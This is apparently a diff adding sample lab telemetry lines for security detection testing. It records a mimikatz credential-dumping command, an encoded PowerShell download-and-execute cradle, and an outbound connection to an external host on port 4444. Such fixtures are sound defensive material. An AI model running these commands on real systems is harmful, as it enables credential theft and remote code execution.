@@ -1,0 +1,4 @@
+process=cmd.exe pid=3100 user=LAB\\user
+artifact=mimikatz sekurlsa::logonpasswords privilege::debug
+process=powershell.exe command="powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"
+connection=10.10.1.50:49822 destination=45.95.147.42:4444
